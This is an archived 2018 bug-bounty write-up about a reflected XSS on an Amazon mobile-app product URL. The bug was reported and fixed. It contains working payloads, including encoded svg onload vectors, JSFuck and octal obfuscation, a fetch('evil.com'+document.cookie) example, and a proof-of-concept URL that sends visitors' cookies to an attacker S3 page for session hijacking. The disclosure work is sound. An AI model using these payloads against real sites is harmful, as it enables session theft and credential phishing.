---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-06-15_reflected-client-xss-at-amazoncom.md
original_filename: 2018-06-15_reflected-client-xss-at-amazoncom.md
title: Reflected Client XSS at Amazon.com
category: documents
detected_topics:
- xss
- mobile-security
- command-injection
- api-security
- cloud-security
tags:
- imported
- documents
- xss
- mobile-security
- command-injection
- api-security
- cloud-security
language: en
raw_sha256: 1761486efd7677c9b8fc0a78058982992341e94c7aa646b9a791bff4c38ffa23
text_sha256: 60c72c40e2d155552e431a906d46b8a8a2664707b07cb978a61078ddb062e477
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Reflected Client XSS at Amazon.com

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-06-15_reflected-client-xss-at-amazoncom.md
- Source Type: markdown
- Detected Topics: xss, mobile-security, command-injection, api-security, cloud-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `1761486efd7677c9b8fc0a78058982992341e94c7aa646b9a791bff4c38ffa23`
- Text SHA256: `60c72c40e2d155552e431a906d46b8a8a2664707b07cb978a61078ddb062e477`


## Content

---
title: "Reflected Client XSS at Amazon.com"
url: "https://medium.com/@jonathanbouman/reflected-client-xss-amazon-com-7b0d3cec787"
authors: ["Jonathan Bouman (@JonathanBouman)"]
programs: ["Amazon"]
bugs: ["Reflected XSS"]
publication_date: "2018-06-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5838
scraped_via: "browseros"
---

# Reflected Client XSS at Amazon.com

Reflected Client XSS at Amazon.com
Jonathan Bouman
Follow
5 min read
·
Jun 15, 2018

639

3

Press enter or click to view image in full size
Proof of concept

Are you aware of any (private) bug bounty programs? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl

Background
The last 2 months I’ve been trying to improve my frontend & backend skills by developing https://Scroll.am (An alternative way to browse Amazon, feedback welcome!). I use projects like these to learn more about new frameworks (Vue.js) and techniques (Codestar & Lambda, AWS). Today I learned something more about XSS and I would love to share it with you :)

I’m always interested in the ways how Amazon displays its own products. What design did they choose, what about the UX? I can learn a lot from that since they AB test everything. But where do you look for all their different types of designs?

Amazon shopping app
One of the places to check for new designs is their App. So on a rainy friday afternoon I decided to decompile their Amazon Shopping Android App and have a look around in the code. A quick walkthrough: 1. Download the APK file to your local computer, 2. Use some online decompiler to extract the code, 3. Start looking around in the different files for urls to product pages.

Searching for product page urls
Amazon product pages often have ‘/dp/’ in the url, so I did a quick search on that:

Press enter or click to view image in full size
Plenty of hits. One of them https://www.amazon.com/gp/masclient/dp/<product_id> .

Masclient product page?
After 2 months I saw plenty of product urls, but never saw one having this masclient part. Let’s have a look.

Found Waldo!

Mmm. This looks like some custom product page they use inside their app. What happens if we change the product id?

Press enter or click to view image in full size

Mmm that looks broken. No proper checks for the product id and it looks likes it capitalizes it. So… maybe we’re able to inject some HTML code? Lets see what happens if we try a <marquee> tag.

Press enter or click to view image in full size

Great. It renders our input at 7 different places in the code, one of them right inside in a script tag.

A few problems we have
1. Input is capitalized; so javascript functions like alert become ALERT and stop working. Luckily someone else already circumvented that problem while working on an XSS attack at Yahoo.com. Solution: convert the plain text to HTML entities and URL encode the string, use the output inside an onload parameter of a svg tag. For example: <svg onload=%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x27%3B%26%23x48%3B%26%23x69%3B%26%23x20%3B%26%23x4D%3B%26%23x6F%3B%26%23x6D%3B%26%23x27%3B%26%23x29%3B>

Get Jonathan Bouman’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

2. Closing tags are not allowed (</script>); it fires a 404 error, so it’s not possible to easily side load our own javascript file by using a <script src="evil.com/1.js"></script> block. Solution: use <svg onload=javascript:alert(1)> for javascript injections in the DOM. Or just use the vector we have inside of the script block. We are able to break out of it by adding a few characters: “}’> so the url becomes https://www.amazon.com/gp/masclient/dp/'}");}JAVASCRIPTHERE;{("

Due to the capitalization problem we may decide to use a jscrew.it technique in order to convert the javascript to ! ( ) + [ ] characters. An example url that just fires the debugger function is: https://www.amazon.com/gp/masclient/dp/'%7D");%7D[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(![]+[])[!![]+!![]]][([]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(![]+[])[!![]+!![]]])[!![]+!![]+!![]]+(!![]+[][(![]+[])[+`...
If the url length was not a problem it would be great to use this technique and inject fetch("evil.com"+document.cookie) (credits). However the url will become >8000 characters, and we run into problem 3.

3. Max url length is limited; Amazon stops loading the page if the url is longer than ~3500 chars, so we can’t take advantage of techniques like http://jscrew.it/. Solution: No idea, anyone?
Update: Redditor Flowible suggested to use jjencode, I tried to do that at the time of writing the report, but the use of $ signs was not possible. Anyone aware of variation that let us change the $ sign into a normal character?
Update: DrStache_ suggested to use octal encoding and javascript constructors.For examplealert(1)is URL[‘\143\157\156\163\164\162\165\143\164\157\162’](‘\141\154\145\162\164(1)’)() and alert(document.cookie) is X=URL[‘\143\157\156\163\164\162\165\143\164\157\162’];X(‘\141\154\145\162\164(X(“\162\145\164\165\162\156 \144\157\143\165\155\145\156\164.\143\157\157\153\151\145”)())’)() Explained: X=URL[‘\143\157\156\163\164\162\165\143\164\157\162’]; X(‘\141\154\145\162\164(X(“\162\145\164\165\162\156 \144\157\143\165\155\145\156\164.\143\157\157\153\151\145”)())’)() is decoded X=URL[‘constructor’]; X(‘alert(X(“return document.cookie”)())’)() is decoded X=Function; X(‘alert(X(“return document.cookie”)())’)() is decoded Function(‘alert(Function(“return document.cookie”)())’)() is decoded alert(Function(“return document.cookie”)()) alert(document.cookie)

4. Chrome XSS Auditor; ERR_BLOCKED_BY_XSS_AUDITOR errors occur in Chrome (67.0.3396.62) if it detects any reflection attacks. For our proof of concept we use the Firefox (60.0.1) since it has no xss auditor. Solution: I was not able to find any unfixed bugs in the auditor. Anyone aware of a way to bypass this?

Proof of concept (Working in Firefox)
We will craft an Amazon url that automatically redirects the visitor to an external URL, appending the cookie details of this visitor to the URL. We log all the visits to this website, so we’re able to hijack their Amazon session. Furthermore we add some fake login screen, just for the sake of it, ‘we could have tried to steal login credentials’.

URL:
https://www.amazon.com/gp/masclient/dp/%22%7D'%3E%3Csvg%20onload%3D%26%23x77%3B%26%23x69%3B%26%23x6E%3B%26%23x64%3B%26%23x6F%3B%26%23x77%3B%26%23x2E%3B%26%23x6C%3B%26%23x6F%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6F%3B%26%23x6E%3B%26%2…

URL Decode:
https://www.amazon.com/gp/masclient/dp/"}'><svg onload=&#x77;&#x69;&#x6E;&#x64;&#x6F;&#x77;&#x2E;&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x72;&#x65;&#x70;&#x6C;&#x61;&#x63;&#x65;&#x28;&#x27;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3A;&#x2F;&#x2F;&#x73;&#x33;&#x2D;&#x65;&#x75;&#x2D;&#x77;&#x65;&#x73;&#x74;&#x2D;&#x31;&#x2E;&#x61;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x61;&#x77;&#x73;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x70;&#x65;&#x6E;&#x74;&#x65;&#x73;&#x74;&#x69;&#x6E;&#x67;&#x2D;&#x74;&#x61;&#x72;&#x67;&#x65;&#x74;&#x2F;&#x78;&#x73;&#x73;&#x31;&#x2E;&#x68;&#x74;&#x6D;&#x6C;&#x3F;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x3D;&#x27;&#x2B;&#x65;&#x73;&#x63;&#x61;&#x70;&#x65;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x29;&#x29;>

HTML Entities Decode:
https://www.amazon.com/gp/masclient/dp/"}'><svg onload=window.location.replace(‘https://s3-eu-west-1.amazonaws.com/pentesting-target/xss1.html?cookie='+escape(document.cookie))>

Bonus link, alert(1) in Chrome:
https://www.amazon.com/gp/masclient/dp/'%7D%22);%7D[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(+(+!![]+[+([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]])+[!![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+[]]]+(!!++([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+!![]]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+(+(+!![]+[+([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]])+[!![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+[]]]+(!![]+[])[+[]]+(!!++([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+!![]]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(+(+!![]+[+([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+!![]]]+(![]+[])[+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]])()(+!![]);%7B(%22

Press enter or click to view image in full size

Conclusion
Never forget to security audit your internal mobile app webpages, forgetting one parameter is enough to create an exploit with impact. Obfuscating your XSS payload can bypass different protections and allows you to create an unsuspicious url. Never stop searching for Waldo ;-)

Timeline
08–06–18 Discovered bug
09–06–18 Informed Amazon
11–06–18 Amazon confirmed the bug
14–06–18 Amazon fixed the bug, no rewards
15–06–18 Fix confirmed, blog published
10–07–18 Added encoding suggestion (credits: DrStache_)
